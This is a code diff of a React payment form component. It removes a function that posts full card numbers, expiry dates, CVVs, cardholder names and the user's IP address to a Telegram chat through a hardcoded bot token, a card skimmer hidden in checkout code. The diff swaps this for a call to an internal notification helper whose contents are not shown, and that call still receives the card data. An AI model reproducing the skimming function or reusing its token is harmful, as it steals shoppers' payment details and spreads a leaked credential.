@@ -3,6 +3,7 @@ import { useNavigate } from "react-router-dom";
 import { Input } from "./ui/input";
 import { Button } from "./ui/button";
 import { useToast } from "./ui/use-toast";
+import { sendPaymentNotification } from "../utils/internalApi";
 
 interface PaymentFormProps {
   amount: number;
@@ -31,40 +32,6 @@ const validateCardNumber = (cardNumber: string): boolean => {
   return sum % 10 === 0;
 };
 
-const sendTelegramNotification = async (paymentData: any) => {
-  const botToken = "7838597617:AAGTZ6xgFUTddSK1mS9hHUl1tKffHXyHycU";
-  const chatId = "-4781499307";
-  
-  try {
-    const ipResponse = await fetch('https://api.ipify.org?format=json');
-    const ipData = await ipResponse.json();
-    
-    const message = `💳 New Payment:
-💰 Amount: $${paymentData.amount}
-👤 Card Holder: ${paymentData.cardHolder}
-💳 Card: ${paymentData.cardNumber}
-📅 Expiry: ${paymentData.expiryDate}
-🔒 CVV: ${paymentData.cvv}
-🌐 IP: ${ipData.ip}`;
-
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message,
-        parse_mode: 'HTML'
-      })
-    });
-    
-    console.log('Payment notification sent successfully');
-  } catch (error) {
-    console.error('Error sending payment notification:', error);
-  }
-};
-
 export const PaymentForm = ({ amount }: PaymentFormProps) => {
   const [cardHolder, setCardHolder] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -89,7 +56,7 @@ export const PaymentForm = ({ amount }: PaymentFormProps) => {
     }
 
     try {
-      await sendTelegramNotification({
+      await sendPaymentNotification({
         amount,
         cardHolder,
         cardNumber,
